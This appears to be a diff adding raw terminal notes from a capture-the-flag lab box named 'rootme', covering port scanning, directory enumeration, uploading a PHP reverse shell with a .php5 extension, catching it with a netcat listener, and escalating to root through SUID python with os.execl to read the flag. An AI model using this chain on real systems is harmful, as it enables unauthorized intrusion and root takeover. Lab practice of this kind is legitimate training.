@@ -1,0 +1,107 @@
+└─$ nmap -sC -A -sV 10.10.140.44                          
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-12 14:55 EDT
+Nmap scan report for 10.10.140.44
+Host is up (0.11s latency).
+Not shown: 997 closed ports
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
+|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
+|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
+80/tcp    open     http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HackIT - Home
+10010/tcp filtered rxapi
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 44.89 seconds
+    
+    
+port 80 reveals nothing
+
+┌──(kali㉿kali)-[~/dirsearch]
+└─$ python3 dirsearch.py -u http://10.10.140.44 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/home/kali/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn't match a supported version!
+  warnings.warn("urllib3 ({}) or chardet ({}) doesn't match a supported "
+
+  _|. _ _  _  _  _ _|_    v0.4.1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30
+Wordlist size: 220520
+
+Error Log: /home/kali/dirsearch/logs/errors-21-05-12_15-03-27.log
+
+Target: http://10.10.140.44/
+
+Output File: /home/kali/dirsearch/reports/10.10.140.44/_21-05-12_15-03-28.txt
+
+[15:03:28] Starting: 
+[15:03:31] 301 -  314B  - /uploads  ->  http://10.10.140.44/uploads/
+[15:03:34] 301 -  310B  - /css  ->  http://10.10.140.44/css/
+[15:03:36] 301 -  309B  - /js  ->  http://10.10.140.44/js/
+[15:04:09] 301 -  312B  - /panel  ->  http://10.10.140.44/panel/
+[15:13:46] 403 -  277B  - /server-status
+
+Task Completed
+     
+     
+uploaded php reverse shell as php5
+
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+     
+sudo install -m =xs $(which python) .
+
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+     
+     
+     
+     
+     
+     
+     ┌──(kali㉿kali)-[~/dirsearch]
+└─$ nc -lvnp 1234
+listening on [any] 1234 ...
+connect to [10.6.65.43] from (UNKNOWN) [10.10.140.44] 50384
+Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 19:55:48 up  1:00,  0 users,  load average: 0.00, 0.02, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ ./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+python -c 'import os; os.execl("/bin/sh", "sh")'          
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
+whoami
+root
+cd /root
+ls
+root.txt
+cat root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
